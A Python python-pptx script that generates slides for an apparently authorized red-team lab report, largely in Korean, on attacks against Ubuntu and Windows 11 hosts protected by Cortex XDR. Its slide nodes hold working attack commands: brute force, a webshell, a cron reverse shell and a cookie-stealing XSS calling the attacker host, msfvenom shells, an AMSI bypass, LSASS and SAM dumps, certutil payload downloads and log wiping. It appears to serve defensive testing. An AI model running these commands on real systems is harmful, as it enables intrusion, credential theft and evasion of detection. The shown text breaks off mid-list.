"""
Red Team Attack Report v3
Process-tree causal visualization + commands + artifacts
White theme / Cortex XDR green
"""
from pptx import Presentation
from pptx.util import Inches, Pt
from pptx.dml.color import RGBColor
from pptx.enum.text import PP_ALIGN
from pptx.oxml.ns import qn
from lxml import etree

# ── Dimensions ───────────────────────────────────────────────
W, H = Inches(13.33), Inches(7.5)

# ── Colors ───────────────────────────────────────────────────
BG      = RGBColor(0xFF,0xFF,0xFF)
HDR     = RGBColor(0x06,0x4E,0x3B)
GREEN   = RGBColor(0x05,0x96,0x69)
GRN_LT  = RGBColor(0xD1,0xFA,0xE5)
GRN_PAL = RGBColor(0xF0,0xFD,0xF4)
WHITE   = RGBColor(0xFF,0xFF,0xFF)
TEXT    = RGBColor(0x11,0x18,0x27)
DGRAY   = RGBColor(0x37,0x41,0x51)
GRAY    = RGBColor(0x9C,0xA3,0xAF)
CMD_BG  = RGBColor(0xEF,0xF6,0xFF)
CMD_TXT = RGBColor(0x1E,0x3A,0x5F)
SUC_BG  = RGBColor(0xDC,0xFC,0xE7)
FAIL_C  = RGBColor(0xDC,0x26,0x26)
FAIL_BG = RGBColor(0xFE,0xE2,0xE2)
BLK_C   = RGBColor(0x7C,0x3A,0xED)
BLK_BG  = RGBColor(0xED,0xE9,0xFE)
AMB_C   = RGBColor(0xD9,0x77,0x06)
AMB_BG  = RGBColor(0xFE,0xF3,0xC7)

PHASE_COL = {
    'recon':   RGBColor(0x1E,0x40,0xAF),
    'init':    RGBColor(0xD9,0x77,0x06),
    'exec':    RGBColor(0xDC,0x26,0x26),
    'privesc': RGBColor(0x7C,0x3A,0xED),
    'cred':    RGBColor(0x06,0x4E,0x3B),
    'persist': RGBColor(0x06,0x4E,0x3B),
    'evasion': RGBColor(0x37,0x41,0x51),
    'web':     RGBColor(0x05,0x96,0x69),
    'lolbin':  RGBColor(0x06,0x4E,0x3B),
    'discover':RGBColor(0x1E,0x40,0xAF),
}

# ── Node geometry ────────────────────────────────────────────
NW   = 1.72   # node width
NH   = 0.62   # node height
CMH  = 0.58   # command height
ARH  = 0.42   # artifact height
NGAP = 0.04   # gap between node, cmd, art stacks
ROW_H = NH + NGAP + CMH + NGAP + ARH + 0.14  # total per row incl gap to next

prs = Presentation()
prs.slide_width  = W
prs.slide_height = H
blank = prs.slide_layouts[6]

# ── Primitives ────────────────────────────────────────────────
def new_slide():
    s = prs.slides.add_slide(blank)
    s.background.fill.solid()
    s.background.fill.fore_color.rgb = BG
    return s

def rct(s, l, t, w, h, fill, border=None, bw=0):
    sh = s.shapes.add_shape(1, Inches(l), Inches(t), Inches(w), Inches(h))
    sh.fill.solid(); sh.fill.fore_color.rgb = fill
    if border: sh.line.color.rgb = border; sh.line.width = Pt(bw)
    else:       sh.line.fill.background()
    return sh

def tb(s, txt, l, t, w, h, sz=12, bold=False, col=None,
       align=PP_ALIGN.LEFT, font=None, italic=False):
    box = s.shapes.add_textbox(Inches(l), Inches(t), Inches(w), Inches(h))
    tf  = box.text_frame; tf.word_wrap = True
    for i, line in enumerate(txt.split('\n')):
        p = tf.paragraphs[0] if i == 0 else tf.add_paragraph()
        p.alignment = align
        r = p.add_run(); r.text = line
        r.font.size = Pt(sz); r.font.bold = bold; r.font.italic = italic
        r.font.color.rgb = col or TEXT
        if font: r.font.name = font

def title_bar(s, title, sub=None):
    rct(s, 0, 0, 13.33, 0.07, GREEN)
    rct(s, 0, 0.07, 13.33, 0.82, HDR)
    tb(s, title, 0.3, 0.1, 12.7, 0.79, sz=26, bold=True, col=WHITE)
    if sub:
        rct(s, 0, 0.89, 13.33, 0.28, GRN_LT)
        tb(s, sub, 0.35, 0.91, 12.6, 0.25, sz=11, col=HDR)
        return 1.23
    return 0.97

# ── Arrow helpers ─────────────────────────────────────────────
def _arrow_head(conn):
    try:
        conn.line.width = Pt(1.8)
        ln = conn.line._ln
        if ln is not None:
            he = etree.SubElement(ln, qn('a:headEnd'))
            he.set('type','arrow'); he.set('w','med'); he.set('len','med')
    except Exception:
        pass

def arrow_h(s, x1, y, x2, col=None, dashed=False):
    col = col or GREEN
    try:
        c = s.shapes.add_connector(1, Inches(x1), Inches(y), Inches(x2), Inches(y))
        c.line.color.rgb = col
        if dashed:
            ln = c.line._ln
            if ln is not None:
                pd = etree.SubElement(ln, qn('a:prstDash')); pd.set('val','dash')
        _arrow_head(c)
    except Exception:
        pass

def arrow_v(s, x, y1, y2, col=None, dashed=False):
    col = col or GREEN
    try:
        c = s.shapes.add_connector(1, Inches(x), Inches(y1), Inches(x), Inches(y2))
        c.line.color.rgb = col
        if dashed:
            ln = c.line._ln
            if ln is not None:
                pd = etree.SubElement(ln, qn('a:prstDash')); pd.set('val','dash')
        _arrow_head(c)
    except Exception:
        pass

def arrow_elbow(s, x1, y1, x2, y2, col=None):
    """L-shaped arrow: go right then down (or up)."""
    col = col or GREEN
    try:
        # Horizontal segment
        c1 = s.shapes.add_connector(1, Inches(x1), Inches(y1), Inches(x2), Inches(y1))
        c1.line.color.rgb = col; c1.line.width = Pt(1.5)
        # Vertical segment with arrowhead
        c2 = s.shapes.add_connector(1, Inches(x2), Inches(y1), Inches(x2), Inches(y2))
        c2.line.color.rgb = col
        _arrow_head(c2)
    except Exception:
        pass

# ── Node drawing ──────────────────────────────────────────────
def node(s, x, y, w, name, mitre, cmd, artifact, phase, result='성공'):
    pc = PHASE_COL.get(phase, GREEN)
    fail = result == '실패'
    blk  = '차단' in result or 'XDR킬' in result

    box_bg  = FAIL_BG if fail else (BLK_BG if blk else GRN_PAL)
    border  = FAIL_C  if fail else (BLK_C  if blk else pc)
    art_bg  = FAIL_BG if fail else (BLK_BG if blk else SUC_BG)
    art_fg  = FAIL_C  if fail else (BLK_C  if blk else HDR)

    # ── main box
    rct(s, x, y, w, NH, box_bg, border, 1.5)
    rct(s, x, y, 0.07, NH, pc)   # left stripe

    # fail/kill badge
    if fail or blk:
        badge_c  = FAIL_C if fail else BLK_C
        badge_bg = FAIL_BG if fail else BLK_BG
        badge_txt = '✗ FAIL' if fail else '⚡XDR킬'
        rct(s, x+w-0.58, y+0.03, 0.55, 0.22, badge_bg, badge_c, 0.8)
        tb(s, badge_txt, x+w-0.57, y+0.04, 0.54, 0.20,
           sz=7, bold=True, col=badge_c, align=PP_ALIGN.CENTER)

    name_w = w-0.64 if (fail or blk) else w-0.12
    tb(s, name, x+0.1, y+0.03, name_w, 0.34, sz=9.5, bold=True, col=TEXT)
    tb(s, mitre, x+0.1, y+0.38, w-0.12, 0.20,
       sz=7, col=pc, italic=True)

    # ── command block
    cy = y + NH + NGAP
    rct(s, x, cy, w, CMH, CMD_BG)
    rct(s, x, cy, 0.40, 0.18, CMD_TXT)
    tb(s, 'CMD', x+0.01, cy+0.02, 0.38, 0.15,
       sz=6.5, bold=True, col=WHITE, align=PP_ALIGN.CENTER)
    tb(s, cmd, x+0.05, cy+0.19, w-0.08, CMH-0.21,
       sz=7, col=CMD_TXT, font='Courier New')

    # ── artifact block
    ay = cy + CMH + NGAP
    rct(s, x, ay, w, ARH, art_bg)
    rct(s, x, ay, 0.40, 0.18, art_fg)
    tb(s, 'ART', x+0.01, ay+0.02, 0.38, 0.15,
       sz=6.5, bold=True, col=WHITE, align=PP_ALIGN.CENTER)
    tb(s, artifact, x+0.05, ay+0.19, w-0.08, ARH-0.21,
       sz=7.5, col=art_fg)

    # return key coords
    mx = x + NH/2          # mid x of node
    cy_node = y + NH/2     # vertical center of node box
    return dict(
        rx=x+w, lx=x, tx=y, bx=ay+ARH,
        cy=cy_node, cx=x+w/2,
        cmd_top=cy, art_top=ay,
    )

# ── Phase column header ───────────────────────────────────────
def phase_hdr(s, x, y, w, label, phase):
    pc = PHASE_COL.get(phase, GREEN)
    rct(s, x, y, w, 0.38, pc)
    tb(s, label, x+0.05, y+0.03, w-0.1, 0.32,
       sz=9.5, bold=True, col=WHITE, align=PP_ALIGN.CENTER)

# ══════════════════════════════════════════════════════════════
# SLIDE 1 – COVER
# ══════════════════════════════════════════════════════════════
s = new_slide()
rct(s, 0, 0, 0.2, 7.5, GREEN)
rct(s, 0.2, 0, 13.13, 7.5, BG)
rct(s, 0.2, 5.6, 13.13, 1.9, GRN_PAL)

tb(s,'RED TEAM\nATTACK EXERCISE',0.55,0.8,12.5,2.2,sz=54,bold=True,col=HDR)
tb(s,'공격 인과관계 · 명령어 · 아티팩트 상세 보고서',
   0.55,3.15,12.5,0.7,sz=20,col=GREEN)
rct(s, 0.55, 3.95, 3.5, 0.05, GREEN)

rows=[('Attacker','Kali Linux  172.16.157.177'),
      ('Target A','Ubuntu 14.04  172.16.157.190  (Cortex XDR 설치됨)'),
      ('Target B','Windows 11  172.16.157.187  (Cortex XDR ACTIVE)'),
      ('Attacks','Ubuntu 22개 기법  ·  Windows 22개 기법  ·  합계 44개'),
      ('Date','2026-05-29  |  CONFIDENTIAL')]
for i,(k,v) in enumerate(rows):
    yy=4.2+i*0.44
    tb(s,k,0.6,yy,1.9,0.38,sz=10,bold=True,col=GRAY)
    tb(s,v,2.5,yy,10.5,0.38,sz=12,col=TEXT)

# ══════════════════════════════════════════════════════════════
# SLIDE 2 – ENVIRONMENT
# ══════════════════════════════════════════════════════════════
s = new_slide()
y0 = title_bar(s,'테스트 환경 구성','Lab Topology · Attacker / Target Overview')

boxes=[
  ('ATTACKER','Kali Linux\n172.16.157.177',
   'Tools:\nnmap · nikto · hydra\nsqlmap · john · msf\nevil-winrm · nc',
   PHASE_COL['exec']),
  ('TARGET A','Ubuntu 14.04\n172.16.157.190\nCortex XDR 설치됨',
   'Services:\nSSH(22) · FTP(21)\nHTTP/DVWA(80)\nWebGoat(8080)',
   HDR),
  ('TARGET B','Windows 11\n172.16.157.187\nCortex XDR ACTIVE',
   'Services:\nWinRM(5985)\nSMB(445) · RDP(3389)\ncyserver PID 5760',
   PHASE_COL['recon']),
]
for i,(lbl,head,body,col) in enumerate(boxes):
    x=0.45+i*4.28
    rct(s,x,y0,3.9,4.8,GRN_PAL,col,1.5)
    rct(s,x,y0,3.9,0.55,col)
    tb(s,lbl,x+0.1,y0+0.06,3.7,0.44,sz=16,bold=True,col=WHITE,align=PP_ALIGN.CENTER)
    tb(s,head,x+0.12,y0+0.65,3.66,1.0,sz=13,bold=True,col=HDR,align=PP_ALIGN.CENTER)
    rct(s,x+0.15,y0+1.75,3.6,0.03,GRN_LT)
    tb(s,body,x+0.12,y0+1.85,3.66,2.7,sz=12,col=DGRAY,align=PP_ALIGN.CENTER)

tb(s,'Attack Flow:  Kali → SSH / FTP / HTTP / WinRM → Ubuntu + Windows',
   0.45,6.3,12.4,0.5,sz=13,bold=True,col=HDR,align=PP_ALIGN.CENTER)

# ══════════════════════════════════════════════════════════════
# SLIDE 3 – Ubuntu Kill Chain  (Recon → Init → Foothold → Root)
# ══════════════════════════════════════════════════════════════
s = new_slide()
y0 = title_bar(s,'Ubuntu 172.16.157.190 – Kill Chain (Phase 1)',
               '인과관계 트리: Recon → Initial Access → Execution → Privilege Escalation')

# Column x starts (6 cols, NW=1.72, gap=0.42, total=6*1.72+5*0.42=12.42")
CX=[0.2, 2.34, 4.48, 6.62, 8.76, 10.9]
PH=['recon','init','exec','privesc','cred','cred']

phase_hdr(s,CX[0],y0,NW,'RECON','recon')
phase_hdr(s,CX[1],y0,NW,'INITIAL ACCESS','init')
phase_hdr(s,CX[2],y0,NW,'EXECUTION','exec')
phase_hdr(s,CX[3],y0,NW,'PRIVILEGE ESC','privesc')
phase_hdr(s,CX[4],y0,NW,'CRED ACCESS','cred')
phase_hdr(s,CX[5],y0,NW,'DEEPER','cred')

ROW1 = y0+0.44
ROW2 = ROW1+ROW_H
ROW3 = ROW2+ROW_H

# ── Row 1: main chain ─────────────────────────────────────────
n0=node(s,CX[0],ROW1,NW,'nmap / nikto 스캔','T1046 · T1595',
    'nmap -sV -sC -p 21,22,80,8080 172.16.157.190\nnikto -h http://172.16.157.190 -C all',
    '포트: 21(FTP) 22(SSH) 80(HTTP) 8080(Tomcat)\nvsftpd3.0.2 / OpenSSH6.6 / Apache2.4','recon')

n1=node(s,CX[1],ROW1,NW,'Hydra SSH 브루트포스','T1110.001',
    'hydra -l webadmin -P rockyou.txt\n  ssh://172.16.157.190 -t 4 -q',
    '크리덴셜 획득: webadmin:admin123','init')

n2=node(s,CX[2],ROW1,NW,'PHP 웹셸 업로드','T1505.003',
    'curl -b "PHPSESSID=xxx;security=low"\n  -F "uploaded=@shell.php" .../upload/',
    '/dvwa/hackable/uploads/shell.php\n→ RCE as www-data','exec')

n3=node(s,CX[3],ROW1,NW,'webadmin sudo → root','T1548.003',
    'ssh webadmin@172.16.157.190\necho "admin123" | sudo -S bash',
    'uid=0(root) gid=0(root)\n→ 완전 시스템 장악','privesc')

n4=node(s,CX[4],ROW1,NW,'/etc/shadow 덤프','T1003.008',
    'cat /etc/shadow | tee /tmp/crack_hashes.txt',
    '/tmp/crack_hashes.txt\nsshuser:$6$... / webadmin:$6$...','cred')

n5=node(s,CX[5],ROW1,NW,'John the Ripper 크랙','T1110.002',
    'john /tmp/crack_hashes.txt\n  --wordlist=rockyou.txt',
    'sshuser → 123\nwebadmin → admin123','cred')

# ── Row 2: branches ───────────────────────────────────────────
n1b=node(s,CX[1],ROW2,NW,'FTP 익명 로그인','T1078',
    'ftp 172.16.157.190\n> user anonymous; get UserDatabase.mv.db',
    'UserDatabase.mv.db (40,960 bytes)\n→ WebGoat H2 DB / 계정 정보','init')

n2b=node(s,CX[2],ROW2,NW,'리버스 셸 실행','T1059.004',
    'msfvenom -p linux/x64/shell_reverse_tcp\n  LHOST=172.16.157.177 LPORT=7777',
    '/tmp/linux_shell.elf (194 bytes)\nKali nc -lvnp 7777 → bash shell','exec')

n4b=node(s,CX[4],ROW2,NW,'MySQL root 무인증','T1078.001',
    'mysql -u root -e\n  "SELECT * FROM dvwa.users"',
    'dvwa.users 전체 (MD5 해시)\nadmin/gordonb/pablo/smithy','cred')

# ── Row 3: fails ─────────────────────────────────────────────
n1c=node(s,CX[1],ROW3,NW,'vsftpd 2.3.4 백도어','T1190',
    'echo "USER test:)" | nc 172.16.157.190 21\nnc 172.16.157.190 6200',
    '실패: 실행 중 버전=3.0.2\nport 6200 Connection refused','init','실패')

n2c=node(s,CX[2],ROW3,NW,'CVE-2021-4034 Pwnkit','T1068',
    'gcc -o trigger pwnkit.c && ./trigger\n(Ubuntu에서 직접 컴파일 시도)',
    '실패: glibc 2.34(Kali) vs 2.19(Ubuntu)\n바이너리 호환 불가','exec','실패')

# ── Main chain arrows ─────────────────────────────────────────
arrow_mid = ROW1 + NH/2
arrow_h(s, CX[0]+NW, arrow_mid, CX[1],            col=PHASE_COL['init'])
arrow_h(s, CX[1]+NW, arrow_mid, CX[2],             col=PHASE_COL['exec'])
arrow_h(s, CX[2]+NW, arrow_mid, CX[3],             col=PHASE_COL['privesc'])
arrow_h(s, CX[3]+NW, arrow_mid, CX[4],             col=PHASE_COL['cred'])
arrow_h(s, CX[4]+NW, arrow_mid, CX[5],             col=PHASE_COL['cred'])

# ── Branch arrows (vertical from main row down) ───────────────
branch_x1 = CX[0]+NW*0.5  # center x of nmap
arrow_elbow(s, CX[0]+NW*0.5, ROW1+NH, CX[1], ROW2, col=PHASE_COL['init'])
arrow_v(s, CX[1]+NW*0.5, ROW2+NH+CMH+ARH+NGAP*2, ROW3, col=FAIL_C, dashed=True)
arrow_v(s, CX[2]+NW*0.5, ROW2+NH+CMH+ARH+NGAP*2, ROW3, col=FAIL_C, dashed=True)
arrow_elbow(s, CX[3]+NW*0.5, ROW1+NH, CX[4], ROW2, col=PHASE_COL['cred'])

# ══════════════════════════════════════════════════════════════
# SLIDE 4 – Ubuntu Post-Root Branches
# ══════════════════════════════════════════════════════════════
s = new_slide()
y0 = title_bar(s,'Ubuntu – Root 획득 이후 분기 (Phase 2)',
               'Post-Exploitation Tree: 자격증명 · 지속성 · 방어회피 · 웹 공격')

# Root node (left)
ROOT_X, ROOT_Y = 0.2, y0+0.44
rn = node(s, ROOT_X, ROOT_Y, 1.65,'sudo root\n획득','T1548.003',
    'echo "admin123" | sudo -S bash',
    'uid=0(root)\n완전 시스템 접근','privesc')

# Branch columns
BC = [2.15, 4.1, 6.05, 8.0, 9.95, 11.9]
BW = 1.72

# Row positions
R1=ROOT_Y; R2=R1+ROW_H; R3=R2+ROW_H; R4=R3+ROW_H

# Cred column (x=BC[0])
phase_hdr(s,BC[0],y0,BW,'CREDENTIAL','cred')
node(s,BC[0],R1,BW,'shadow 덤프 → John','T1003.008',
    'cat /etc/shadow\njohn crack → sshuser:123 / webadmin:admin123',
    '/tmp/crack_hashes.txt\n크랙 결과 2개 계정','cred')
node(s,BC[0],R2,BW,'MySQL root 접근','T1078.001',
    'mysql -u root -e "SELECT * FROM dvwa.users"',
    'dvwa.users MD5 해시 전체 덤프','cred')

# Persist column
phase_hdr(s,BC[1],y0,BW,'PERSISTENCE','persist')
node(s,BC[1],R1,BW,'cron 백도어 등록','T1053.003',
    '(crontab -l; echo "*/5 * * * * bash -i\n>& /dev/tcp/177/9999 0>&1") | crontab -',
    '/var/spool/cron/crontabs/root 수정\n5분마다 리버스 셸','persist')
node(s,BC[1],R2,BW,'SUID bash 백도어','T1548.001',
    'cp /bin/bash /tmp/.hidden_root\nchmod u+s /tmp/.hidden_root',
    '/tmp/.hidden_root (-rwsr-xr-x root)\n/tmp/.hidden_root -p → root shell','persist')
node(s,BC[1],R3,BW,'SSH authorized_keys','T1098.004',
    'ssh-keygen -t rsa -f /tmp/bk_key\necho pub >> /root/.ssh/authorized_keys',
    '/root/.ssh/authorized_keys\n공격자 공개키 → 패스워드 없이 SSH','persist')

# Evasion column
phase_hdr(s,BC[2],y0,BW,'DEFENSE EVASION','evasion')
node(s,BC[2],R1,BW,'로그 전체 삭제','T1070.003',
    'truncate -s 0 /var/log/auth.log\n/var/log/syslog; rm -f ~/.bash_history',
    'auth.log / syslog / bash_history\n포렌식 증거 완전 삭제','evasion')

# Web col 1
phase_hdr(s,BC[3],y0,BW,'WEB EXPLOIT (1)','web')
node(s,BC[3],R1,BW,'SQLmap DB 덤프','T1190',
    'sqlmap -u ".../sqli/?id=1&Submit=Submit"\n  --cookie="PHPSESSID=x;security=low" --dump',
    'dvwa 전체 테이블\nadmin:password (MD5 크랙)','web')
node(s,BC[3],R2,BW,'XSS Reflected/Stored','T1059.007',
    '<script>document.location=\n"http://177/c?c="+document.cookie</script>',
    'PHPSESSID 탈취 가능\nguestbook 영구 저장','web')
node(s,BC[3],R3,BW,'LFI /etc/passwd','T1083',
    'curl ".../fi/?page=\n../../../../etc/passwd"',
    '/etc/passwd 27개 계정 노출\n/etc/hosts · /proc/version','web')

# Web col 2
phase_hdr(s,BC[4],y0,BW,'WEB EXPLOIT (2)','web')
node(s,BC[4],R1,BW,'IDOR 사용자 접근','T1087',
    'curl ".../user_info.php?id=2"\n  -b "PHPSESSID=x;security=low"',
    '타 사용자 개인정보 노출\nid 파라미터 순차 조작','web')
node(s,BC[4],R2,BW,'약한 세션 ID (Mutillidae)','T1539',
    '# Burp Sequencer 세션 분석\ncurl -b "PHPSESSID=1" .../mutillidae/',
    '세션 ID 순차 예측 가능\n세션 고정/탈취 가능','web')
node(s,BC[4],R3,BW,'WebGoat SQLi + H2 DB','T1190',
    'curl ".../SqlInjection/attack5a"\n  -d "account=Smith\' OR \'1\'=\'1"',
    'UserDatabase.mv.db (40KB) 다운로드\nguest:guest / webgoat:webgoat','web')

# Root → branch arrows (fan out)
rx = ROOT_X + 1.65
ry = ROOT_Y + NH/2
for bx in BC:
    arrow_elbow(s, rx, ry, bx, R1, col=GREEN)

# ══════════════════════════════════════════════════════════════
# SLIDE 5 – Windows Kill Chain Phase 1
# ══════════════════════════════════════════════════════════════
s = new_slide()
y0 = title_bar(s,'Windows 172.16.157.187 – Kill Chain (Phase 1)',
               '인과관계 트리: Recon → WinRM → AMSI Bypass → Execution → Credential Access')

phase_hdr(s,CX[0],y0,NW,'RECON','recon')
phase_hdr(s,CX[1],y0,NW,'INIT ACCESS','init')
phase_hdr(s,CX[2],y0,NW,'BYPASS','evasion')
phase_hdr(s,CX[3],y0,NW,'EXECUTION','exec')
phase_hdr(s,CX[4],y0,NW,'CRED ACCESS','cred')
phase_hdr(s,CX[5],y0,NW,'DEEPER EXEC','exec')

ROW1=y0+0.44; ROW2=ROW1+ROW_H; ROW3=ROW2+ROW_H

# Row 1 main chain
node(s,CX[0],ROW1,NW,'nmap 포트 스캔','T1046',
    'nmap -sV -sC -p 445,5985,3389,80\n  172.16.157.187',
    '포트: 5985(WinRM) 445(SMB) 3389(RDP)\nSMB share: test-shared-song (writable)','recon')

node(s,CX[1],ROW1,NW,'Evil-WinRM 접속','T1021.006',
    "evil-winrm -i 172.16.157.187\n  -u Administrator -p 'Password123!'",
    'Administrator PowerShell 셸 획득\nSMB 경유 파일 업로드 가능','init')

node(s,CX[2],ROW1,NW,'AMSI 우회 (리플렉션)','T1562.001',
    '[Ref].Assembly.GetType(\n"Sys...AmsiUtils").GetField(\n"amsiInitFailed",...).SetValue($null,$true)',
    'amsiInitFailed = $true (메모리)\nAMSI 검사 비활성화 → 악성 PS 실행 가능','evasion')

node(s,CX[3],ROW1,NW,'Meterpreter 실행','T1059.001',
    'msfvenom -p windows/x64/meterpreter/\n  reverse_tcp LHOST=177 LPORT=5555 -f exe',
    'C:\\Windows\\Temp\\svchost_update.exe (7680B)\nPID 46788 실행 → XDR 감지','exec')

node(s,CX[4],ROW1,NW,'LSASS 메모리 덤프','T1003.001',
    '$id=(Get-Process lsass).Id\nrundll32 comsvcs.dll MiniDump $id\n  C:\\Windows\\Temp\\lsass.dmp full',
    'C:\\Windows\\Temp\\lsass.dmp (116,287 bytes)\n→ 자격증명 파싱 가능 (Mimikatz)','cred')

node(s,CX[5],ROW1,NW,'SAM 덤프 (reg save)','T1003.002',
    'reg save HKLM\\SAM C:\\Temp\\SAM /y\nreg save HKLM\\SYSTEM C:\\Temp\\SYSTEM /y',
    'C:\\Windows\\Temp\\SAM\nC:\\Windows\\Temp\\SYSTEM\n→ impacket secretsdump','cred')

# Row 2: parallel execution branches
node(s,CX[2],ROW2,NW,'Base64 인코딩 PS','T1027',
    '$enc=[Convert]::ToBase64String(\n  [Text.Encoding]::Unicode.GetBytes("whoami"))\npowershell -enc $enc',
    'Event ID 4104 스크립트 블록 기록\n난독화 명령 실행 → 탐지 우회','evasion')

node(s,CX[3],ROW2,NW,'Bind 셸 (port 4444)','T1059',
    'msfvenom -p windows/x64/shell_bind_tcp\n  LPORT=4444 -f exe -o /tmp/bind.exe',
    'C:\\Windows\\Temp\\bind.exe (7680B)\nKali nc 172.16.157.187 4444 → cmd.exe\n★ XDR가 프로세스 강제 킬','exec','성공→XDR차단')

node(s,CX[4],ROW2,NW,'In-memory 셸코드','T1620',
    '$buf=[Byte[]](0x90,0x90...)\n$ptr=[Marshal]::AllocHGlobal($buf.Length)',
    'PAGE_EXECUTE_READWRITE 메모리 할당\nXDR: 의심 메모리 작업 감지 가능','exec')

# Row 3
node(s,CX[3],ROW3,NW,'UAC 우회 (fodhelper)','T1548.002',
    'New-Item "HKCU:\\...ms-settings\\\nShell\\Open\\command" -Value "cmd.exe"\nStart-Process fodhelper.exe',
    'HKCU\\...\\ms-settings\\Shell\\Open\\command\n고권한 cmd.exe 획득','privesc')

node(s,CX[4],ROW3,NW,'XDR 서비스 종료 시도','T1562',
    'sc.exe stop cyserver\nStop-Service cyserver\ntaskkill /PID 5760 /F',
    '★ 전부 실패: "액세스가 거부되었습니다"\nSelf-Protection 정상 동작 확인','privesc','실패')

# Main chain arrows
am = ROW1+NH/2
arrow_h(s,CX[0]+NW,am,CX[1],col=PHASE_COL['init'])
arrow_h(s,CX[1]+NW,am,CX[2],col=PHASE_COL['evasion'])
arrow_h(s,CX[2]+NW,am,CX[3],col=PHASE_COL['exec'])
arrow_h(s,CX[3]+NW,am,CX[4],col=PHASE_COL['cred'])
arrow_h(s,CX[4]+NW,am,CX[5],col=PHASE_COL['cred'])

# Branch arrows
arrow_v(s,CX[2]+NW*0.5,ROW1+NH+CMH+ARH+NGAP*2,ROW2,col=PHASE_COL['evasion'])
arrow_v(s,CX[3]+NW*0.5,ROW1+NH+CMH+ARH+NGAP*2,ROW2,col=PHASE_COL['exec'])
arrow_v(s,CX[3]+NW*0.5,ROW2+NH+CMH+ARH+NGAP*2,ROW3,col=PHASE_COL['privesc'])
arrow_v(s,CX[4]+NW*0.5,ROW1+NH+CMH+ARH+NGAP*2,ROW2,col=PHASE_COL['exec'])
arrow_v(s,CX[4]+NW*0.5,ROW2+NH+CMH+ARH+NGAP*2,ROW3,col=FAIL_C,dashed=True)

# ══════════════════════════════════════════════════════════════
# SLIDE 6 – Windows Post-Access Branches
# ══════════════════════════════════════════════════════════════
s = new_slide()
y0 = title_bar(s,'Windows – 관리자 접근 이후 분기 (Phase 2)',
               'Persistence · Defense Evasion · LOLBins · Discovery (Evil-WinRM 세션에서 전부 수행)')

ROOT_X,ROOT_Y=0.2,y0+0.44
node(s,ROOT_X,ROOT_Y,1.62,'Evil-WinRM\nAdmin Shell','T1021.006',
    "evil-winrm -i 172.16.157.187\n  -u Administrator -p 'Password123!'",
    'Administrator PowerShell 세션\n모든 하위 공격의 진입점','init')

BC=[2.12,4.0,5.88,7.76,9.64,11.52]
BW=1.72
R1=ROOT_Y; R2=R1+ROW_H; R3=R2+ROW_H

# Persistence
phase_hdr(s,BC[0],y0,BW,'PERSISTENCE','persist')
node(s,BC[0],R1,BW,'스케줄 작업 등록','T1053.005',
    'schtasks /create /tn "WindowsUpdate"\n  /tr "C:\\Temp\\svchost.exe"\n  /sc minute /mo 5 /ru SYSTEM /f',
    'WindowsUpdate 작업 등록\n5분마다 SYSTEM 권한 실행','persist')
node(s,BC[0],R2,BW,'레지스트리 Run 키','T1547.001',
    'reg add "HKLM\\SOFTWARE\\Microsoft\\\nWindows\\CurrentVersion\\Run"\n  /v Updater /t REG_SZ /d svchost.exe /f',
    'HKLM\\...\\Run\\Updater\n로그인 시 자동 실행','persist')
node(s,BC[0],R3,BW,'악성 서비스 등록','T1543.003',
    'sc.exe create SvcUpdate\n  binPath= "C:\\Temp\\svchost.exe"\n  start= auto\nsc.exe start SvcUpdate',
    '서비스 SvcUpdate 등록\n부팅 시 자동 시작','persist')

# Backdoor
phase_hdr(s,BC[1],y0,BW,'BACKDOOR ACCT','persist')
node(s,BC[1],R1,BW,'백도어 계정 생성','T1136.001',
    'net user support P@ssw0rd123! /add\nnet localgroup Administrators\n  support /add',
    '계정 support 생성\nAdministrators 그룹 추가','persist')

# Defense Evasion
phase_hdr(s,BC[2],y0,BW,'DEF EVASION (1)','evasion')
node(s,BC[2],R1,BW,'Defender 제외 경로','T1562.001',
    'Add-MpPreference -ExclusionPath\n  "C:\\Windows\\Temp"\n  -ExclusionProcess "svchost_update.exe"',
    'C:\\Windows\\Temp 스캔 제외\n페이로드 감지 회피','evasion')
node(s,BC[2],R2,BW,'WDigest 캐싱 활성화','T1112',
    'reg add "HKLM\\SYSTEM\\...\\WDigest"\n  /v UseLogonCredential\n  /t REG_DWORD /d 1 /f',
    'UseLogonCredential=1\n평문 패스워드 메모리 보관','evasion')

# Evasion 2
phase_hdr(s,BC[3],y0,BW,'DEF EVASION (2)','evasion')
node(s,BC[3],R1,BW,'이벤트 로그 전체 삭제','T1070.001',
    'wevtutil cl Security\nwevtutil cl System\nwevtutil cl Application',
    'Security/System/Application 로그 삭제\n포렌식 증거 인멸','evasion')
node(s,BC[3],R2,BW,'방화벽 비활성화','T1562.004',
    'netsh advfirewall set\n  allprofiles state off',
    '도메인/프라이빗/퍼블릭 전부 OFF\n인바운드 제한 해제','evasion')

# LOLBins
phase_hdr(s,BC[4],y0,BW,'LOLBIN','lolbin')
node(s,BC[4],R1,BW,'certutil 페이로드 DL','T1218',
    'certutil -urlcache -split -f\n  http://177/update.exe\n  C:\\Windows\\Temp\\update.exe',
    'C:\\Windows\\Temp\\update.exe\n정상 시스템 바이너리 악용','lolbin')
node(s,BC[4],R2,BW,'bitsadmin 백그라운드 DL','T1218',
    'bitsadmin /transfer job /download\n  /priority normal\n  http://177/payload C:\\Temp\\p2.exe',
    'BITS 작업 생성\nC:\\Temp\\p2.exe 다운로드','lolbin')

# Discovery
phase_hdr(s,BC[5],y0,BW,'DISCOVERY','discover')
node(s,BC[5],R1,BW,'내부망 호스트 스캔','T1018',
    '1..254 | % {\n  if(Test-Connection -Count 1 -Quiet\n  "172.16.157.$_"){ Write-Host $_ } }',
    '활성 호스트:\n172.16.157.177 / .187 / .190','discover')

# Root → branch arrows
rx = ROOT_X+1.62; ry = ROOT_Y+NH/2
for bx in BC:
    arrow_elbow(s,rx,ry,bx,R1,col=GREEN)

# ══════════════════════════════════════════════════════════════
# SLIDE 7 – XDR Self-Protection & Detection
# ══════════════════════════════════════════════════════════════
s = new_slide()
y0 = title_bar(s,'Cortex XDR 탐지 결과 및 Self-Protection 검증',
               'Expected Detections · Self-Protection Test · XSIAM XQL Queries')

# Left: detections
rct(s,0.2,y0,6.2,5.8,GRN_PAL,GREEN,1.2)
rct(s,0.2,y0,6.2,0.42,HDR)
tb(s,'XDR 탐지 예상 이벤트',0.35,y0+0.05,6.0,0.34,sz=13,bold=True,col=WHITE)

det=[
  ('HIGH','LSASS 메모리 덤프','comsvcs.dll MiniDump → lsass.dmp 116KB','T1003.001',FAIL_C,FAIL_BG),
  ('HIGH','Bind.exe 프로세스 강제 종료','XDR가 bind.exe 실행 직후 킬','T1059',FAIL_C,FAIL_BG),
